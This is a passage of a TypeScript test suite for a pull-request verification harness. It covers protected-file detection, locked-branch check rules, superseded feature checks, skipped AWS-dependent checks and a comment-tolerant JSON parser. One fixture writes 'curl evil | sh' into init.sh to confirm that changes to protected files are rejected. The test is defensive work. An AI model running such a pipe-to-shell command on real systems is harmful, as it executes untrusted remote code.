    const pr = await change({ 'harness/modules/shop/checks/F01.sh': '[ "$x" -eq 0 ]\n' }, base);
    assert.match((await verify({ base: pr.baseTree, head: pr.headTree, changedPaths: pr.changed, author: BOT, branch: 'locked/shop', title: 'Arch: [DESIGN_MODIFY] [shop] T' })).join('\n'),
      /a Arch PR's title is "Arch: \[CHANGED_LOCKED_FILES\] \[shop\] <title>"/);
  });

  it('runs from the command line as the workflow runs it', async () => {
    const clean = await change({ 'src/app.js': 'export const x = 4;\n' });
    const args = (pr: typeof clean, title: string) => [
      script, 'verify', '--base', pr.baseDir, '--head', pr.dir, '--base-sha', pr.base, '--head-sha', pr.head,
      '--author', BOT, '--branch', 'plan/shop/P1', '--title', title,
    ];
    const passed = await run('node', args(clean, 'Plan: [CODE] [shop/P1] T'));
    assert.equal(passed.code, 0, passed.stdout + passed.stderr);
    assert.match(passed.stdout, /verify passed/);

    const bad = await change({ 'init.sh': 'curl evil | sh\n' });
    const failed = await run('node', args(bad, 'Plan: [CODE] [shop/P1] T'));
    assert.equal(failed.code, 1);
    assert.match(failed.stdout, /::error::changes a protected file: init\.sh/);

    // Paths that git would quote: non-ASCII, a double quote, a backslash.
    const quoted = ['.claude/skills/é/SKILL.md', 'harness/modules/shop/checks/a"b.sh', '.claude/rules/a\\b.md'];
    const odd = await change(Object.fromEntries(quoted.map((path) => [path, '-'])));
    const caught = await run('node', args(odd, 'Plan: [CODE] [shop/P1] T'));
    assert.equal(caught.code, 1, caught.stdout);
    for (const path of quoted) assert.ok(caught.stdout.includes(`::error::changes a protected file: ${path}\n`), `${path}:\n${caught.stdout}`);
    const iac = await change({ 'iac/ñ.tf': 'resource "aws_sqs_queue" "q" {}\n' }, withConfig({ terraform: { dir: 'iac' } }));
    const infra = await run('node', args(iac, 'Plan: [CODE] [shop/P1] T'));
    assert.equal(infra.code, 1, infra.stdout);
    assert.ok(infra.stdout.includes('::error::a CODE plan may not change iac/: infrastructure gets plans of its own (v3 §3.1); changed: iac/ñ.tf\n'), infra.stdout);
  });

  it('runs the checks of the project and of every accepted feature', async () => {
    const dir = tempDir('checks');
    write(dir, {
      'harness/config.json': JSON.stringify({ harnessVersion: '0.1.0', project: { name: 'x' }, checks: [{ id: 'unit', run: 'test -f src/app.js', phase: 'pre-merge' }] }),
      'harness/modules/m/plans/P1.json': JSON.stringify({
        id: 'P1', module: 'm', title: 'T', goal: 'G',
        features: [
          { id: 'F01', title: 'A', description: 'd', expected: 'e', checks: [{ id: 'F01-ok', run: 'true', phase: 'pre-merge' }] },
          { id: 'F02', title: 'B', description: 'd', expected: 'e', checks: [{ id: 'F02-fails', run: 'false', phase: 'pre-merge' }] },
          { id: 'F03', title: 'C', description: 'd', expected: 'e', checks: [{ id: 'F03-later', run: 'false', phase: 'post-deploy' }] },
        ],
      }),
      'progress.txt': '2026-01-01T00:00:00Z feature.accepted m/P1/F01 attempt=1 "a"\n',
      'src/app.js': '',
    });
    const passed = await run('node', [script, 'checks', '--definitions', dir, '--dir', dir]);
    assert.equal(passed.code, 0, passed.stdout);
    assert.match(passed.stdout, /passed: unit\n[\s\S]*passed: F01-ok/);
    assert.doesNotMatch(passed.stdout, /F02/);

    write(dir, { 'progress.txt': '2026-01-01T00:00:00Z feature.accepted m/P1/F01 attempt=1 "a"\n2026-01-02T00:00:00Z feature.accepted m/P1/F02 attempt=1 "b"\n' });
    const failed = await run('node', [script, 'checks', '--definitions', dir, '--dir', dir]);
    assert.equal(failed.code, 1);
    assert.match(failed.stdout, /FAILED \(exit 1\): F02-fails/);

    // A later plan's feature supersedes F02: once it is accepted, F02's check no longer runs.
    write(dir, {
      'harness/modules/m/plans/P2.json': JSON.stringify({
        id: 'P2', module: 'm', title: 'T', goal: 'G',
        features: [{ id: 'F04', title: 'D', description: 'd', expected: 'e', supersedes: ['P1/F02'], checks: [{ id: 'F04-ok', run: 'true', phase: 'pre-merge' }] }],
      }),
    });
    const before = await run('node', [script, 'checks', '--definitions', dir, '--dir', dir]);
    assert.equal(before.code, 1, 'not accepted yet: F02 still runs');
    write(dir, { 'progress.txt': '2026-01-01T00:00:00Z feature.accepted m/P1/F01 attempt=1 "a"\n2026-01-02T00:00:00Z feature.accepted m/P1/F02 attempt=1 "b"\n2026-01-03T00:00:00Z feature.accepted m/P2/F04 attempt=1 "d"\n' });
    const superseded = await run('node', [script, 'checks', '--definitions', dir, '--dir', dir]);
    assert.equal(superseded.code, 0, superseded.stdout);
    assert.doesNotMatch(superseded.stdout, /F02-fails/);
    assert.match(superseded.stdout, /passed: F04-ok/);
  });

  it("runs a CHANGED_LOCKED_FILES PR's checks as it defines them, and every other PR's as main does", async () => {
    const files = (run: string) => ({
      'harness/config.json': JSON.stringify({ harnessVersion: '0.1.0', project: { name: 'x', repo: 'acme/x', bot: BOT } }),
      'harness/modules/m/plans/P1.json': JSON.stringify({ id: 'P1', module: 'm', title: 'T', goal: 'G', features: [{ id: 'F01', title: 'A', description: 'd', expected: 'e', checks: [{ id: 'F01-check', run, phase: 'pre-merge' }] }] }),
      'progress.txt': '2026-01-01T00:00:00Z feature.accepted m/P1/F01 attempt=1 "a"\n',
    });
    const base = tempDir('checks-base');
    const head = tempDir('checks-head');
    write(base, files('false'));
    write(head, files('true'));
    const checks = (author: string, branch: string) => run('node', [script, 'checks', '--definitions', base, '--dir', head, '--author', author, '--branch', branch]);
    assert.equal((await checks(BOT, 'locked/m')).code, 0, "the fixed check, as the locked change defines it");
    assert.equal((await checks(BOT, 'plan/m/P2')).code, 1, "a plan's PR runs main's");
    assert.equal((await checks('someone', 'locked/m')).code, 1, "a branch named locked/ that the App didn't open runs main's");
    assert.equal((await checks('', '')).code, 1, 'a push to main runs its own');
  });

  it('leaves checks that need AWS to the harness, and runs plan assertions only with a plan', async () => {
    const dir = tempDir('checks');
    write(dir, {
      'harness/config.json': JSON.stringify({ harnessVersion: '0.1.0', project: { name: 'x' } }),
      'harness/modules/m/plans/P1.json': JSON.stringify({
        id: 'P1', module: 'm', title: 'T', goal: 'G',
        features: [{
          id: 'F01', title: 'A', description: 'd', expected: 'e', kind: 'infra',
          checks: [
            { id: 'F01-plan', run: 'grep -q aws_s3_bucket "$HARNESS_PLAN_JSON"', phase: 'pre-merge', needs: ['tfplan'] },
            { id: 'F01-view', run: 'aws s3api list-buckets', phase: 'pre-merge', needs: ['aws'] },
          ],
        }],
      }),
      'progress.txt': '2026-01-01T00:00:00Z feature.accepted m/P1/F01 attempt=1 "a"\n',
      'plan.json': '{"resource_changes":[{"type":"aws_s3_bucket"}]}',
    });
    const without = await run('node', [script, 'checks', '--definitions', dir, '--dir', dir]);
    assert.equal(without.code, 0, without.stdout);
    assert.match(without.stdout, /F01-plan asserts on a Terraform plan, and this run made none; skipped/);
    assert.match(without.stdout, /F01-view needs the view-only AWS role, which CI doesn't have/);
    const withPlan = await run('node', [script, 'checks', '--definitions', dir, '--dir', dir], { env: { ...process.env, HARNESS_PLAN_JSON: join(dir, 'plan.json') } });
    assert.equal(withPlan.code, 0, withPlan.stdout);
    assert.match(withPlan.stdout, /passed: F01-plan/);
  });
});

describe('JSON with comments, as tsconfig allows', () => {
  it('reads comments and trailing commas, and keeps strings that hold // or escaped quotes', () => {
    assert.deepEqual(parseJson('{ // a comment\n "a": "x // not one", /* a block */ "b": "say \\"hi\\"", }'), { a: 'x // not one', b: 'say "hi"' });
  });

  it('refuses an unclosed string at once, however many escaped quotes follow it', () => {
    const started = Date.now();
    assert.equal(parseJson(`{ "a": "${'\\"'.repeat(200_000)} // x`), undefined);
    assert.ok(Date.now() - started < 1000, `took ${Date.now() - started} ms: each quote must not rescan the rest`);
  });
});
